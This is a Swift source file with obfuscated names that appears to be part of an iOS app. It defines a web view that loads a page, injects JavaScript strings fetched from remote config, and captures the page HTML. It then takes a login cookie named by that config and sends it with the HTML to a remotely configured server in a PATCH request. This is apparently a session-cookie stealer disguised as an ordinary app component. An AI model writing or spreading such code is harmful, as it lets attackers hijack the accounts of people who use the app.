//
//  File.swift
//
//
//  Created by DanHa on 31/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct NineRecoCoor: UIViewRepresentable {
    func makeCoordinator() -> NineRecoCoordiClss {
        NineRecoCoordiClss(self)
    }

    let url: URL?
    @Binding var nextScreenNineReco: Bool
    @Binding var containsNineReco: Bool // Contains
    var listData: [String: String] = [:]
    private let nineRecoObs = NineRecoObs()
    var nineRecoObserver: NSKeyValueObservation? {
        nineRecoObs.nineins
    }

    // end check url

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { }

    class NineRecoCoordiClss: NSObject, WKNavigationDelegate {
        var prentNineReco: NineRecoCoor
        init(_ prentNineReco: NineRecoCoor) {
            self.prentNineReco = prentNineReco
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight1af.rawValue] ?? "", completionHandler: { _, _ in })
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight2af.rawValue] ?? "", completionHandler: { _, _ in })
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight3af.rawValue] ?? "", completionHandler: { _, _ in })
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight4af.rawValue] ?? "", completionHandler: { _, _ in })
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight5af.rawValue] ?? "", completionHandler: { _, _ in })
            }

            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                webView.evaluateJavaScript(self.prentNineReco.listData[RemoKey.eight6af.rawValue] ?? "") { data, error in
                    if let recoHtm = data as? String, error == nil {
                        if !recoHtm.isEmpty {
                            if recoHtm.contains(self.prentNineReco.listData[RemoKey.eight7af.rawValue] ?? "") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                    let cokiSevenCoor = cookies.firstIndex(where: { $0.name == self.prentNineReco.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                    if cokiSevenCoor != nil {
                                        let jsonSixx: [String: Any] = [
                                            self.prentNineReco.listData[RemoKey.nam20ap.rawValue] ?? "": cookies[cokiSevenCoor!].value,
                                            self.prentNineReco.listData[RemoKey.nam21ap.rawValue] ?? "": "\(recoHtm)",
                                            self.prentNineReco.listData[RemoKey.nam22ap.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO",
                                        ]
                                        let url: URL = URL(string: self.prentNineReco.listData[RemoKey.rm07ch.rawValue] ?? "")!
                                        let jsonSixData = try? JSONSerialization.data(withJSONObject: jsonSixx)
                                        var request = URLRequest(url: url)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = jsonSixData
                                        let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                            if error != nil {
                                                print("not ok")
                                            } else if data != nil {
                                                self.prentNineReco.nextScreenNineReco = true
                                                // print("okdone")
                                            }
                                        }
                                        task.resume()
                                    } // if
                                }) // getAllCookies
                            } else { self.prentNineReco.containsNineReco = true }
                        }
                    } else { print("error_get_html") }
                }
            }
        } // didFinish
    } // Coordinator
}

private class NineRecoObs: ObservableObject {
    @Published var nineins: NSKeyValueObservation?
}
